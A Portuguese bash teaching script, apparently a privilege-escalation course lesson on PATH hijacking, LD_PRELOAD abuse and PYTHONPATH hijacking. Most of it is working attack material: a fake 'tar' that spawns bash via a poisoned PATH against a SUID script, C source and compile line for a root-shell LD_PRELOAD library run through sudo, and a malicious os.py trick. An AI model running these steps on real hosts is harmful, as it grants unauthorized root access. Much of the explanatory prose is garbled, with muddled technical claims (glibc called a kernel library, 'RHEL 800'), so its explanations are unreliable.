#!/bin/bash
# ==============================================================================
# Módulo 5: Escalação de Privilégios (Privesc)
# Aula 04 - Path Hijacking e LD_PRELOAD
# ==============================================================================
#
# 1. ANALOGIA DO DIA A DIA
# Você ligou pro bombeiro da cidade (O comando do sistema) pq a empresa da fogo. 
# "Chame O Bombeiro!" você grita na portaria pro OS. Mas você é hacker q subornou o
# porteiro. O porteiro tem uma lista de números (O PATH) e telefona NA ORDEM, 
# do papelucho de 1 a 10. Normalmenrte ele ia ler "Numero #10 é da prefeitura...".
# Ms você pegou o adesivo amarelo, escreveu um número #1 FALSO de Bombeiro - q 
# q atende na sua casa gangue com um machado vestido de herói.
# Ao gritar p "Chame O bombeiro", o sistema obedece cegamente a ordem do papel de cima 
# pra baixo. Ele invoca SEU HEROI MALWARE que rouba os PCs todos e não desliga o fogo (Hijack). 
#
# 2. O QUE É (definição técnica Senior)
# PATH Manipulation: A variável global $PATH do ambiente Shell Linux diz OS DIRETÓRIOS DE PROCURA DE BINÁRIOS
# quando um comando sem a barra (ex: `ls` e não `/usr/bin/ls`) é invocado pela sys-child. 
# Se um script executável de Root / SUID utiliza um comando cru de serviço de rede `ping` por exemplo, 
# sem o path abs `/bin/ping`, nós Exportamos a ENV pra apontar seu path custom pra ele.
# LD_PRELOAD Shared Library Override: O hack de injetar `.so` dinâmicos pre-loadados
# nos binários antes do Loader e do linker C puxar os libc normais nativos dos OS. Nós substituímos 
# funcionalidades nativas (tipo fazer c q o strcmp aceitasse qq senha como == TRUE p backdoor).
#
# ==============================================================================
# 3. SCRIPT / COMANDO COMENTADO
# ==============================================================================

# O basico pra checar como vc resolve ordens da shell tua:
echo "[+] Meu caminho de Execução Local Ordenado:"
echo $PATH

# ========== HIJACKING NO PATH MANUALMENTE =======
# Passo 1 Ofensivo: Se você descobriu q tem script SUID chamado `backup` no seu Host Invadido. E percebe logando ou disnassabling (strings) que ele ta invocando `tar ...` lá dentro e não o path total /bin/tar.

# Criamos nosso PROPRIO "tar" executável maligno e envenenado na tmp, que roda Bash
# echo '/bin/bash' > /tmp/tar
# chmod +x /tmp/tar

# AGORA a mágica do Hijack pra exportar meu tar falso pra frente do original no mundo e enganar scripts!
# export PATH=/tmp:$PATH 
# Veja q dpois disa, dndo echo Path no console o '/tmp' é o bloco PRIMEIRO que o OS da read busca!
# Entao eu rodo o utilitário SUID: `./backup`
# POW! Ele chamou *MEU TAR falso* DA TMP sem checar as origens mas ELE AINDA TA COM A EUID ROOT FLAG dele pq eu engatilhei e não pisei!. A bash root cai do ceu liso e tu eh SysAdmin master.

# ==============================================================================
# 4. PASSO A PASSO
# ==============================================================================
# SOBRE O LD_PRELOAD NO SUDO-L DA AULA 02:
# Passo 1: Digite `sudo -l`. Nas rules dele de cima aparece `env_keep += LD_PRELOAD`. 
# Passo 2: O Sr. sysadmin esqueceu que LD PRELOAD carrega biblots *do path* que a gente manda em memória ANTES dos modulos rootos normais. E ele manteve a ENV ativa.
# Passo 3: Vamos no vim local no kali dev linux. Codamos em C++ linguagem pura pra lib `exploit.c`:
# ```c
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() {
#     unsetenv("LD_PRELOAD");
#     setgid(0); setuid(0); system("/bin/bash");
# }
# ```
# Passo 4: Nós Compilamos nosso Shared Object com posição independetn runtime `.so`: `gcc -fPIC -shared -o shell.so exploit.c -nostartfiles`.
# Passo 5: Invoco MEU malware pre_load no processo Sudo autorado legítimo do SysAdmin com permissao nativa (ex: find): `sudo LD_PRELOAD=/tmp/shell.so find`. BOOM. A primeira Library de boot da engine de loader q o FIND carrega no Linker é meu .SO hookado q dá init num shell reverso e descarta de executar o real FIND q travava a RCE!
#
# 5. VERIFICAÇÃO E TROUBLESHOOTING
# O Hijack PATH nao é persistente n Host, assim q der Ctrl+D no bash e logout de SSH, a variavel Path morre com você. Sempre atrele o hijack dinâmico interativo via SSH live ou pule pro Reverse-Shell Payload de nc puro q fica mantido no process tree.
#
# 6. CONCEITO SENIOR (o "porquê" profundo)
# "Por que diabos os Sysadmins mantém LD_PRELOAD ativão sabendo do perigo de Override das libs do kernel?". Pelo Legado, jovem mancebo gaba farda azul. As empresas tinham que rodar Programas Antigos do Mainfrante DB2 Cobol / Software proprietério Oracle do inicio de 2012 e a glibc 2.3.4 (library nativa do kernel) que os binarios C da Oracle exigian NAO rodavam mais nos binarios do RHEL 800 e Debian 11. Em vez deles recriarem a Engine da Oracle (Impossiible) eles fazem a ponte da morte Override "LD Library Path Preload" empurrando as .so customizadas de pastas de opt para enganar os programas nativos de app de legado! Só que ao deixar global via PAM ou Sudo Env_keepers sem santizar as variaveis o RCE root de hook cai pros hackers no passivo!
#
# 7. PERGUNTA DE ENTREVISTA / CTF
# Pergunta: "Se tu tens um Script q usa o comando /usr/bin/python Absolute Path pra te ferrar e impedir o hack do Path Manipullation anterior (ele chammou a raiz!), mas vc nota q nas tools python q ele clama tem o Import das variaveis lib globais do PIP. E vc tmb NAO tem pre-load setado p C... Como da hijack na Engine dinamicade interpretação Python Local em run-time como Faxineiro root?"
# Resposta Esperada: O manipulador de Path Curo é pra binários do POSIX / bash. Pra Python, eu manipularia o `PYTHONPATH` system environment variable local ! Seto ele p minha temp de diretorio falsa: `export PYTHONPATH=/tmp` e faço as libraries falseta `os.py` minha do meu jeito na tmp q chamem os shells ou deamons de rev shells. Quando o python puxa o pacote do SO e sys na lib root ele injeta a falseta via PYTHONPATH precedence lookup bypass e PUM, owna a maquina na linguagem 7. 
